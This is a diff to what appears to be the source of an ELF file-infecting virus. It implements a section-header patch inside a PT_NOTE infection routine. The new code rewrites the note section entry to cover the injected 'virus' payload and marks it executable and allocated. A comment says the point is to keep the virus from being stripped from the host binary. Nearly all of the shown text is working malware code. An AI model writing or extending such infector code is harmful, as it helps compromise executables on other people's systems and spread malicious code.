@@ -22,12 +22,26 @@ uint64_t round_up_to(uint64_t v, uint64_t alignment) {
   return (v & ~(alignment - 1)) + alignment;
 }
 
-/*
-bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
-               size_t padded_virus_size, const ElfInfo& info) {
-  return true;
+bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr, uint64_t virus_size,
+               uint64_t virus_offset, const ElfInfo& info) {
+  auto sht_entry_count = ehdr.e_shnum;
+  auto* section_entry = &shdr;
+
+  for (size_t i = 0; i < sht_entry_count; ++i) {
+    if (section_entry->sh_offset == info.original_pt_note_file_offset) {
+      section_entry->sh_offset = virus_offset;
+      section_entry->sh_size = virus_size;
+      section_entry->sh_addr = info.parasite_load_address;
+      section_entry->sh_type = SHT_PROGBITS;
+      section_entry->sh_flags = SHF_EXECINSTR | SHF_ALLOC;
+      return true;
+    }
+    // Move to the next section entry
+    ++section_entry;
+  }
+  // Failed to find the section header entry.
+  return false;
 }
-*/
 
 void patch_phdr(Elf64_Phdr& phdr, uint64_t virus_size, uint64_t virus_offset,
                 const ElfInfo& info) {
@@ -116,14 +130,16 @@ bool pt_note_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
     patch_phdr(mutable_phdr, virus_size, virus_offset, info);
   }
 
-  /*{
+  {
+    // mutate a note section entry to cover our virus so it doesn't get
+    // stripped.
     auto& mutable_shdr = *reinterpret_cast<Elf64_Shdr*>(
         host_mapping.mutable_base() + ehdr.e_shoff);
-    if (!patch_sht(ehdr, mutable_shdr, padded_virus_size, info)) {
+    if (!patch_sht(ehdr, mutable_shdr, virus_size, virus_offset, info)) {
       vt::printf("Failed to patch section header table\n");
       return false;
     }
-  }*/
+  }
 
   {
     auto& mutable_ehdr =
